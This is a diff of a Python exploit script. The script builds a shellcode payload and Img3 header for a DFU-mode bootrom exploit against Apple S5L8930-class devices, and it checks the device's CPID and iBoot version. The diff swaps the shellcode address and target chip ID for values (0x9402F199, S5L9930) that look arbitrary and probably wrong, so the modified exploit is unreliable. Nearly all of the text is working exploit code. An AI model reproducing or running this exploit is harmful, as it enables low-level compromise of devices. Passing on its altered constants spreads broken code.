@@ -4,7 +4,7 @@ import struct, sys, time
 import dfu
 
 def generate_payload():
-    shellcode_address = 0x8402F198 + 1
+    shellcode_address = 0x9402F199 + 1
     data = struct.pack('<40sI', '\xF0' * 40, shellcode_address)
     tags = data + struct.pack('<4s2I4s2I', 'SHSH'[::-1], 12, 0, 'CERT'[::-1], 12, 0)
     header = struct.pack('<4s3I4s', 'Img3'[::-1], 20 + len(tags), len(tags), len(data), 'ibss'[::-1])
@@ -23,8 +23,8 @@ def exploit():
         print 'Device is already in pwned DFU Mode. Not executing exploit.'
         return
 
-    if 'CPID:8930' not in device.serial_number:
-        print 'ERROR: Not a compatible device. This exploit is for S5L8930 devices only. Exiting.'
+    if 'CPID:9930' not in device.serial_number:
+        print 'ERROR: Not a compatible device. This exploit is for S5L9930 devices only. Exiting.'
         sys.exit(1)
 
     if 'SRTG:[iBoot-574.4]' not in device.serial_number:
